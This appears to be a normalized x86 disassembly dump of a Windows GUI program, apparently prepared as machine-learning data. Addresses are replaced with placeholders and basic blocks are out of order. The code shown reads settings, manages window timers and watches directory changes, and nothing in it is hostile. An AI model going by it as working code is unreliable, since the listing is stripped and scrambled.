lea ecx [ esp + 0x530 ]
call sub_435100
test eax eax
je r-xdata
test esi esi
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push rw-data
jmp r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
mov [ esp + 0x10 ] edi
jne r-xdata
test ecx ecx
je r-xdata
movsx edx al
lea ecx [ ecx + ecx * 4 ]
lea ecx [ edx + ecx * 2 - 0x30 ]
mov [ esp + 0x14 ] ecx
cmp edi 0x1
mov edx eax
sub edx esi
sar edx 0x2
cmp ecx edx
jae r-xdata
mov edx eax
sub edx esi
sar edx 0x2
xor edx edx
jmp r-xdata
sub eax edx
push eax
lea ecx [ esp + 0x41c ]
push ecx
mov ecx rw-data
call sub_401e80
push ebx
push 0x104
push rw-data
push r--data
push r--data
push r--data
lea ecx [ esp + 0x534 ]
call sub_435230
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x4b
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x1
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x9
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x5
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x5
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x1
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_4351e0
push ebx
push rw-data
push 0x7
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_4351e0
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x1
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push 0x104
push rw-data
push r--data
push r--data
push r--data
lea ecx [ esp + 0x534 ]
call sub_435230
mov al [ rw-data ]
test al al
mov esi [ lstrcpyA@IAT ]
jne r-xdata
mov al [ edi ]
cmp al 0x30
jl r-xdata
test ecx ecx
je r-xdata
xor ecx ecx
mov [ esp + 0x14 ] ecx
mov edx [ esi + 0x4 ]
test edx edx
jne r-xdata
lea ecx [ esi + ecx * 4 ]
cmp ecx eax
je r-xdata
sub ecx edx
lea esi [ esp + 0x10 ]
push esi
push ecx
push ecx
mov ecx esp
mov [ ecx ] eax
mov ecx rw-data
call sub_469770
mov eax [ rw-data ]
mov esi [ rw-data ]
jmp r-xdata
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0xe
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x4
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0xa
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0xa
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0xa
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0xa
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x32
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0xffffff
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
mov eax [ r--data ]
mov ecx [ r--data ]
mov edx [ r--data ]
mov [ esp + 0xa4 ] eax
push ebx
xor eax eax
push 0x3c
mov [ esp + 0xb6 ] eax
mov [ esp + 0xb0 ] ecx
push rw-data
mov [ esp + 0xbe ] eax
lea ecx [ esp + 0x90 ]
push ecx
mov [ esp + 0xc6 ] eax
mov [ esp + 0xb0 ] edx
mov dx [ r--data ]
push r--data
mov [ esp + 0xce ] eax
push r--data
lea ecx [ esp + 0x534 ]
mov [ esp + 0x9c ] 0xfffffff0
mov [ esp + 0xa0 ] edi
mov [ esp + 0xa4 ] edi
mov [ esp + 0xa8 ] edi
mov [ esp + 0xac ] 0x190
mov [ esp + 0xb0 ] 0x0
mov [ esp + 0xb1 ] 0x0
mov [ esp + 0xb2 ] 0x0
mov [ esp + 0xb3 ] 0x80
mov [ esp + 0xb4 ] 0x0
mov [ esp + 0xb5 ] 0x0
mov [ esp + 0xb6 ] 0x0
mov [ esp + 0xb7 ] 0x1
mov [ esp + 0xc4 ] dx
mov [ esp + 0xd6 ] ax
call sub_4353f0
push ebx
push 0x104
push rw-data
push r--data
push r--data
push r--data
lea ecx [ esp + 0x534 ]
call sub_435230
mov al [ rw-data ]
test al al
jne r-xdata
push r--data
push rw-data
call esi
mov edx [ ebp ]
test edx edx
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov eax ecx
mov [ rw-data ] eax
push ebx
push rw-data
push 0x5
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
mov eax [ rw-data ]
xor esi esi
cmp eax edi
jle r-xdata
push r--data
push rw-data
call esi
mov ecx [ ebp + 0x4 ]
sub ecx edx
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov eax [ esi + 0x8 ]
lea edx [ esp + 0x14 ]
push edx
push 0x1
push ecx
mov ecx esp
mov [ ecx ] eax
mov ecx esi
call sub_41ce70
mov eax [ esi + 0xc ]
sub eax edx
sar eax 0x2
cmp ecx eax
jae r-xdata
test edx edx
je r-xdata
push ebx
push rw-data
push 0x1
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
mov ebp [ wsprintfA@IAT ]
mov edi 0x1
mov [ esp + 0x54 ] r--data
mov [ esp + 0x58 ] r--data
mov [ esp + 0x5c ] r--data
mov [ esp + 0x60 ] r--data
mov [ esp + 0x10 ] 0x10
lea ebx [ ebx ]
mov [ esp + 0x10 ] edi
jmp r-xdata
mov eax [ ebp + 0x4 ]
lea edx [ esp + 0x14 ]
push edx
push 0x1
push ecx
mov ecx esp
mov [ ecx ] eax
mov ecx esi
call sub_41ce70
mov eax [ ebp + 0x8 ]
sub eax edx
sar eax 0x2
cmp ecx eax
jae r-xdata
test edx edx
je r-xdata
mov eax [ esp + 0x1c ]
mov edi [ esi + 0x8 ]
push eax
push esi
lea ecx [ esp + 0x1c ]
push ecx
push 0x1
push edi
call sub_420d80
add esp 0x14
add edi 0x4
mov [ esi + 0x8 ] edi
mov edi [ esp + 0x10 ]
jmp r-xdata
cmp esi 0x4
jl r-xdata
inc esi
cmp esi 0x4
jl r-xdata
lea ebp [ esi + 0x1 ]
push ebp
lea edx [ esp + 0x114 ]
push r--data
push edx
call [ wsprintfA@IAT ]
add esp 0xc
push ebx
push 0x104
lea eax [ esp + 0x31c ]
push eax
push r--data
lea ecx [ esp + 0x120 ]
push ecx
push r--data
lea ecx [ esp + 0x534 ]
call sub_435230
test eax eax
jne r-xdata
mov eax [ esp + 0x1c ]
mov edi [ ebp + 0x4 ]
push eax
push esi
lea ecx [ esp + 0x1c ]
push ecx
push 0x1
push edi
call sub_420d80
add esp 0x14
add edi 0x4
mov [ ebp + 0x4 ] edi
jmp r-xdata
cmp edi 0x1
jle r-xdata
mov esi [ rw-data ]
test esi esi
mov edx [ rw-data ]
jne r-xdata
mov eax [ esp + esi * 4 + 0x54 ]
push edi
push eax
lea ecx [ esp + 0x118 ]
push r--data
push ecx
call ebp
add esp 0x10
push ebx
lea edx [ esp + esi * 4 + 0x44 ]
push edx
push 0x0
lea eax [ esp + 0x11c ]
push eax
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
test eax eax
jne r-xdata
jmp r-xdata
test esi esi
jle r-xdata
mov edi [ rw-data ]
test edi edi
jne r-xdata
push ebx
push rw-data
push 0x1
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x10
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x1000
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push 0x104
push rw-data
push r--data
push r--data
push r--data
lea ecx [ esp + 0x534 ]
call sub_435230
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push 0x104
push rw-data
push r--data
push r--data
push r--data
lea ecx [ esp + 0x534 ]
call sub_435230
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push 0x50
push rw-data
push r--data
push r--data
push r--data
lea ecx [ esp + 0x534 ]
call sub_435230
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push 0x100
push rw-data
push r--data
push r--data
push r--data
lea ecx [ esp + 0x534 ]
call sub_435230
push ebx
push 0x50
push rw-data
push r--data
push r--data
push r--data
lea ecx [ esp + 0x534 ]
call sub_435230
push ebx
push rw-data
push 0xf
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push r--data
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435780
push ebx
push rw-data
push r--data
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435780
push ebx
push rw-data
push r--data
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435780
push ebx
push rw-data
push r--data
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435780
push ebx
push rw-data
push r--data
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435780
push ebx
push rw-data
push r--data
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435780
push ebx
push rw-data
push r--data
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435780
lea eax [ esp + 0x51c ]
push ebx
push eax
call sub_40bdb0
mov eax [ esp + 0x88 ]
add esp 0x8
cmp eax 0x10
jb r-xdata
mov ecx [ esp + 0x54 ]
mov edx [ esp + 0x58 ]
sub esp 0x10
mov eax esp
mov [ eax ] ecx
mov ecx [ esp + 0x6c ]
mov [ eax + 0x4 ] edx
mov edx [ esp + 0x70 ]
mov [ eax + 0x8 ] ecx
dec edi
push edi
mov ecx rw-data
mov [ eax + 0xc ] edx
call sub_429960
mov eax edx
sub eax esi
sar eax 0x4
xor eax eax
jmp r-xdata
sub esp 0x1c
mov eax esp
mov [ esp + 0x2c ] esp
mov [ eax + 0x18 ] 0xf
mov [ eax + 0x14 ] 0x0
push esi
mov ecx rw-data
mov [ eax + 0x4 ] 0x0
call sub_421e10
mov ecx [ rw-data ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
lea ecx [ esp + 0x51c ]
mov [ esp + 0x80 ] 0xf
mov [ esp + 0x7c ] 0x0
mov [ esp + 0x6c ] 0x0
mov [ esp + 0x10530 ] 0xffffffff
call sub_434eb0
mov ecx [ esp + 0x10528 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x10524
retn
mov ecx [ esp + 0x6c ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov edx [ esp + 0x10 ]
mov ecx [ esp + 0x40 ]
lea eax [ edx + esi - 0x10 ]
mov [ eax ] ecx
mov edx [ esp + 0x44 ]
mov [ eax + 0x4 ] edx
mov ecx [ esp + 0x48 ]
mov [ eax + 0x8 ] ecx
mov edx [ esp + 0x4c ]
mov [ eax + 0xc ] edx
mov eax [ esp + 0x10 ]
inc edi
add eax 0x10
mov [ esp + 0x10 ] eax
jmp r-xdata
test esi esi
je r-xdata
cmp eax edi
jge r-xdata
mov [ esp + 0x38 ] 0xf
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x24 ] 0x0
lea edx [ eax + 0x1 ]
mov ecx [ esp + 0x10 ]
add ecx edi
lea esi [ eax + 0x1 ]
jmp r-xdata
cmp esi edx
lea eax [ esp + 0x314 ]
jge r-xdata
xor esi esi
lea ecx [ esp + 0x40 ]
push ecx
push 0x1
push ecx
mov eax esp
mov ecx rw-data
mov [ eax ] edx
call sub_429610
mov eax [ esp + 0x10 ]
inc edi
add eax 0x10
mov [ esp + 0x10 ] eax
jmp r-xdata
mov ecx [ rw-data ]
mov eax edx
sub eax esi
sub ecx esi
sar eax 0x4
sar ecx 0x4
cmp eax ecx
jae r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea eax [ esp + 0x318 ]
push eax
lea ecx [ esp + 0x28 ]
call sub_401e80
lea ecx [ esp + 0x20 ]
push ecx
mov ecx rw-data
mov [ esp + 0x10534 ] 0x3
call sub_407460
cmp [ esp + 0x38 ] 0x10
mov [ esp + 0x10530 ] 0x2
jb r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
mov ecx [ esp + 0x1c ]
push ecx
push rw-data
lea eax [ esp + 0x48 ]
push eax
push 0x1
push edx
mov esi edx
call sub_428de0
mov eax [ esp + 0x24 ]
add esi 0x10
add esp 0x14
inc edi
add eax 0x10
mov [ rw-data ] esi
mov [ esp + 0x10 ] eax
jmp r-xdata
mov [ esp + 0x38 ] 0xf
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x24 ] 0x0
mov edx [ esp + 0x24 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
sub eax esi
push eax
lea edx [ esp + 0x318 ]
push edx
call sub_401e80
jmp r-xdata
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ rw-data ]
mov esi ebp
add ecx 0x1c
cmp esi eax
mov [ esp + 0x10 ] ecx
jl r-xdata
sub_47e330
mov eax [ rw-data ]
push ebx
push ebp
mov ebp [ esp + 0xc ]
cmp eax ebp
push esi
push edi
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
mov ecx [ rw-data ]
je r-xdata
call sub_46fdf0
mov eax [ rw-data ]
mov bl [ esp + 0x24 ]
test bl bl
je r-xdata
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ rw-data ]
test ecx ecx
mov [ rw-data ] ebp
mov eax ebp
je r-xdata
cmp eax ebp
je r-xdata
mov al [ esp + 0x24 ]
test al al
je r-xdata
dec eax
cmp eax 0x5
ja r-xdata
mov eax [ rw-data ]
test eax eax
push ecx
mov [ esp + 0x18 ] esp
mov ecx esp
je r-xdata
cmp eax 0x5
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ esp + 0x1c ]
push 0x0
push 0x0
push 0x0
push 0x0
push eax
push ecx
call sub_466930
mov ecx [ rw-data ]
add esp 0x18
push 0x0
push 0x0
push ecx
call [ InvalidateRect@IAT ]
pop edi
pop esi
pop ebp
pop ebx
retn
test bl bl
je r-xdata
jmp [ eax * 4 + jump_table_47e8c8 ]
mov [ ecx ] eax
mov eax [ rw-data ]
test eax eax
push ecx
mov [ esp + 0x1c ] esp
mov ecx esp
je r-xdata
inc [ eax + 0xd48 ]
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ rw-data ]
push 0x0
push 0x0
push 0x0
push 0x0
push eax
push ecx
call sub_466930
mov eax [ esp + 0x38 ]
add esp 0x18
test al al
push 0x0
push 0x0
je r-xdata
mov eax [ rw-data ]
test eax eax
push ecx
mov [ esp + 0x18 ] esp
mov ecx esp
je r-xdata
mov eax [ rw-data ]
test eax eax
push ecx
mov [ esp + 0x18 ] esp
mov ecx esp
je r-xdata
mov eax [ rw-data ]
test eax eax
push ecx
mov [ esp + 0x18 ] esp
mov ecx esp
je r-xdata
mov eax [ rw-data ]
test eax eax
push ecx
mov [ esp + 0x18 ] esp
mov ecx esp
je r-xdata
mov eax [ rw-data ]
test eax eax
push ecx
mov [ esp + 0x18 ] esp
mov ecx esp
je r-xdata
mov eax [ rw-data ]
test eax eax
push ecx
mov [ esp + 0x18 ] esp
mov ecx esp
je r-xdata
mov [ ecx ] eax
call sub_45ef80
add esp 0x8
inc [ eax + 0xd48 ]
mov ecx rw-data
call sub_404310
xor ebx ebx
mov eax [ rw-data ]
push eax
call [ InvalidateRect@IAT ]
mov edx [ rw-data ]
push 0x0
push 0x0
push eax
push edx
push 0x0
call sub_478af0
add esp 0x1c
jmp r-xdata
mov [ ecx ] eax
mov eax [ rw-data ]
test eax eax
push ecx
mov [ esp + 0x1c ] esp
mov ecx esp
je r-xdata
inc [ eax + 0xd48 ]
mov [ ecx ] eax
mov eax [ rw-data ]
test eax eax
push ecx
mov [ esp + 0x1c ] esp
mov ecx esp
je r-xdata
inc [ eax + 0xd48 ]
mov [ ecx ] eax
mov eax [ rw-data ]
test eax eax
push ecx
mov [ esp + 0x1c ] esp
mov ecx esp
je r-xdata
inc [ eax + 0xd48 ]
mov [ ecx ] eax
mov eax [ rw-data ]
test eax eax
push ecx
mov [ esp + 0x1c ] esp
mov ecx esp
je r-xdata
inc [ eax + 0xd48 ]
mov [ ecx ] eax
mov eax [ rw-data ]
test eax eax
push ecx
mov [ esp + 0x1c ] esp
mov ecx esp
je r-xdata
inc [ eax + 0xd48 ]
mov [ ecx ] eax
mov eax [ rw-data ]
test eax eax
push ecx
mov [ esp + 0x1c ] esp
mov ecx esp
je r-xdata
inc [ eax + 0xd48 ]
mov eax [ rw-data ]
sub eax edi
sar eax 0x2
xor eax eax
jmp r-xdata
mov edx [ rw-data ]
push edx
call sub_466150
mov eax [ rw-data ]
add esp 0x4
push 0xffffffeb
push eax
call [ GetWindowLongA@IAT ]
mov esi eax
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
mov [ esp + 0x14 ] edx
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ ecx ] eax
call sub_45fb70
jmp r-xdata
inc [ eax + 0xd48 ]
mov [ ecx ] eax
call sub_45e630
jmp r-xdata
inc [ eax + 0xd48 ]
push 0x0
mov [ ecx ] eax
call sub_45e820
add esp 0xc
jmp r-xdata
inc [ eax + 0xd48 ]
push 0x1
mov [ ecx ] eax
call sub_45e820
add esp 0xc
jmp r-xdata
inc [ eax + 0xd48 ]
mov [ ecx ] eax
call sub_45eba0
jmp r-xdata
inc [ eax + 0xd48 ]
mov [ ecx ] eax
call sub_45ed70
inc [ eax + 0xd48 ]
mov ecx rw-data
call sub_401420
mov eax [ rw-data ]
push eax
mov [ rw-data ] ebp
call sub_419a00
mov ecx [ rw-data ]
mov edx [ esp + 0x1c ]
push 0x1
push 0x0
push ecx
push edx
call sub_485220
add esp 0x14
pop edi
pop esi
pop ebp
pop ebx
retn
mov esi [ edi + ebx * 4 ]
test esi esi
lea edi [ edi + ebx * 4 ]
je r-xdata
cmp ebx eax
jge r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov esi [ rw-data ]
test esi esi
mov edi [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
add esp 0x8
fstp [ rw-data ]
mov [ edi ] 0x0
mov edx [ rw-data ]
mov [ edx + ebx * 4 ] 0xffffffff
inc ebx
jmp r-xdata
dec [ esi + 0xd48 ]
jne r-xdata
add esi 0x108
push esi
push rw-data
call sub_4013c0
add esp 0x8
test al al
je r-xdata
lea eax [ esi + 0x108 ]
push eax
push rw-data
call sub_4013c0
add esp 0x8
test al al
jne r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
test edi edi
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov edi [ rw-data ]
test edi edi
jne r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov esi [ rw-data ]
test esi esi
mov edi [ rw-data ]
jl r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov esi [ rw-data ]
test esi esi
jl r-xdata
mov ecx [ rw-data ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
call sub_45f9e0
cmp [ rw-data ] 0x2
jne r-xdata
mov ecx rw-data
call sub_4010f0
cmp esi eax
jge r-xdata
mov ecx rw-data
call sub_4010f0
cmp esi eax
jge r-xdata
imul esi esi 0x70
mov esi [ esi + edi + 0x30 ]
cmp esi 0x1
je r-xdata
cmp esi edx
jge r-xdata
mov esi [ rw-data ]
test esi esi
jl r-xdata
imul esi esi 0x70
mov esi [ esi + edi + 0x30 ]
test esi esi
je r-xdata
imul esi esi 0x70
mov esi [ esi + edi + 0x30 ]
cmp esi 0x1
je r-xdata
cmp esi 0xffffffff
jne r-xdata
mov ecx rw-data
call sub_4010f0
cmp esi eax
jge r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp esi 0x2
je r-xdata
cmp esi 0xffffffff
je r-xdata
cmp esi 0x9
jne r-xdata
imul esi esi 0x70
mov esi [ esi + edi + 0x30 ]
test esi esi
je r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
push sub_45ba40
push 0xbb8
push 0x3
mov [ rw-data ] edx
push eax
mov ecx [ rw-data ]
push eax
push ecx
call [ KillTimer@IAT ]
cmp esi 0x1
je r-xdata
mov edx [ rw-data ]
mov [ rw-data ] edx
mov [ rw-data ] 0x200
pop edi
pop esi
pop ebp
pop ebx
retn
cmp esi 0x2
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
push sub_45ba40
push 0xbb8
push 0x3
mov [ rw-data ] ecx
push edx
jmp r-xdata
push eax
mov eax [ rw-data ]
push eax
call [ KillTimer@IAT ]
mov [ rw-data ] 0x136
call [ SetTimer@IAT ]
mov [ rw-data ] eax
sub_47e8e0
mov ecx rw-data
call sub_404310
mov al [ esp + 0x8 ]
test al al
je r-xdata
call sub_46fdf0
mov al [ esp + 0xc ]
test al al
je r-xdata
mov edx [ rw-data ]
push esi
xor esi esi
jmp r-xdata
mov ecx rw-data
jmp sub_401420
mov eax [ esp + 0x4 ]
mov ecx [ rw-data ]
push 0x1
push 0x0
push 0x0
push eax
push ecx
call sub_47e330
add esp 0x14
test edx edx
jne r-xdata
mov eax [ rw-data ]
sub eax edx
sar eax 0x2
xor eax eax
jmp r-xdata
mov [ rw-data ] 0xffffffff
pop esi
mov ecx [ edx + esi * 4 ]
test ecx ecx
je r-xdata
cmp esi eax
jge r-xdata
inc esi
jmp r-xdata
call sub_439ed0
mov edx [ rw-data ]
sub_47e970
push 0xffffffff
push sub_4c1075
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2d8
push ebx
push ebp
xor edx edx
push esi
push edi
mov [ esp + 0x98 ] 0xf
xor eax eax
mov [ esp + 0x94 ] edx
mov [ esp + 0x84 ] dl
mov [ esp + 0x2f0 ] eax
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x2f8 ]
mov cl [ eax + 0x4 ]
test cl cl
jne r-xdata
mov ecx [ esp + 0x2e8 ]
pop edi
pop esi
pop ebp
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x2e4
retn
jmp r-xdata
mov eax [ rw-data ]
mov edi [ rw-data ]
mov ebx 0x10
cmp eax ebx
jae r-xdata
test edx edx
mov ebp [ rw-data ]
je r-xdata
mov edi rw-data
cmp edx ebp
jb r-xdata
cmp edx ebp
mov ecx edx
jb r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
xor eax eax
cmp edx ebp
setne al
test eax eax
je r-xdata
cmp [ esp + 0x98 ] ebx
mov esi [ esp + 0x84 ]
jae r-xdata
mov ecx ebp
mov esi [ esp + 0x20 ]
mov eax rw-data
lea edx [ eax + 0x1 ]
xor eax eax
[ esi ] [ edi ]
je r-xdata
lea esi [ esp + 0x84 ]
push esi
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
je r-xdata
call [ Sleep@IAT ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push rw-data
push ebp
push 0x0
mov ecx rw-data
call sub_401150
test eax eax
je r-xdata
test eax eax
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
mov ecx [ esp + 0x2f8 ]
mov al [ ecx + 0x4 ]
test al al
je r-xdata
mov edi [ WaitForSingleObject@IAT ]
mov esi [ esp + 0x20 ]
lea ecx [ ecx ]
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
mov edx [ esp + 0x94 ]
jmp r-xdata
mov esi [ esp + 0x20 ]
xor edi edi
push esi
call [ FindNextChangeNotification@IAT ]
push 0xc8
push esi
call edi
cmp eax 0x102
jne r-xdata
xor edi edi
mov [ esp + 0x3c ] edi
mov [ esp + 0x40 ] edi
mov [ esp + 0x44 ] edi
mov ebp 0xf
mov [ esp + 0x7c ] ebp
mov [ esp + 0x78 ] edi
mov [ esp + 0x68 ] 0x0
mov edx [ esp + 0x2f8 ]
mov al [ edx + 0x4 ]
test al al
mov ecx [ rw-data ]
mov [ esp + 0x2f0 ] 0x2
mov [ esp + 0x1c ] ecx
jne r-xdata
cmp [ rw-data ] ebx
mov eax [ rw-data ]
jae r-xdata
push eax
call [ FindCloseChangeNotification@IAT ]
cmp [ esp + 0x98 ] 0x10
jb r-xdata
push esi
call [ FindCloseChangeNotification@IAT ]
cmp esi edi
je r-xdata
mov ecx rw-data
call sub_404310
cmp [ rw-data ] edi
mov ebx 0x10
je r-xdata
push 0x11
push 0x0
push eax
call [ FindFirstChangeNotificationA@IAT ]
mov esi eax
cmp esi 0xffffffff
mov [ esp + 0x20 ] esi
jne r-xdata
mov eax rw-data
mov edx [ esp + 0x84 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
push esi
call [ FindCloseChangeNotification@IAT ]
mov ecx rw-data
mov [ esp + 0x20 ] edi
call sub_401420
cmp [ esp + 0x7c ] ebx
jb r-xdata
cmp [ rw-data ] ebx
mov eax [ rw-data ]
jae r-xdata
push 0xffffffff
push 0x0
push rw-data
lea ecx [ esp + 0x8c ]
call sub_401dd0
jmp r-xdata
xor esi esi
mov [ esp + 0x20 ] esi
mov [ esp + 0x7c ] ebp
mov [ esp + 0x78 ] edi
mov [ esp + 0x68 ] 0x0
mov [ esp + 0x2f0 ] 0x0
mov [ esp + 0x3c ] edi
mov [ esp + 0x40 ] edi
mov [ esp + 0x44 ] edi
mov eax [ esp + 0x68 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ rw-data ]
mov edx [ esp + 0x94 ]
push ecx
push eax
push edx
push edi
lea ecx [ esp + 0x90 ]
call sub_401150
test eax eax
jne r-xdata
mov eax rw-data
test esi esi
push 0xc8
jne r-xdata
cmp [ rw-data ] edi
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x34 ] ebx
jb r-xdata
add eax 0x20
mov eax [ eax + 0x20 ]
jmp r-xdata
mov ecx [ rw-data ]
add ecx 0xfc
call sub_41f020
lea ecx [ esp + 0x48 ]
mov ebx eax
call sub_433b70
xor esi esi
mov [ esp + 0x2f0 ] 0x3
xor ebp ebp
jmp r-xdata
push eax
lea eax [ esp + 0x84 ]
